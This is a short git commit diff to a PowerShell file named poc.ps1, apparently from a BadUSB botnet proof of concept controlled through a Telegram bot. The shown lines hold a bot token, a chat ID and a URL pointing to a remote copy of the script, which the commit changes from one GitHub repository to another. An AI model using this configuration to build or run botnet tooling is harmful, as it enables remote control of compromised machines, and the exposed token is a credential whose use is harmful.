ea5f66509d3aad65135d3e12a60bdb96f4f4aed7
thomosyan <160520075+thomosyan@users.noreply.github.com>
2024-02-19 19:37:38 +0300

    Update poc.ps1

--- poc.ps1
+++ poc.ps1
@@ -21,7 +21,7 @@ BOT TELEGRAM:
 
 $BotToken = "6987459251:AAFu8hGq_QM9eI5ZbloOmsrilMue6sYR-KA"
 $ChatID = '-4158606176'
-$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
+$githubScript = 'https://github.com/thomosyan/badusb/blob/main/poc.ps1'
 
 
 ###############
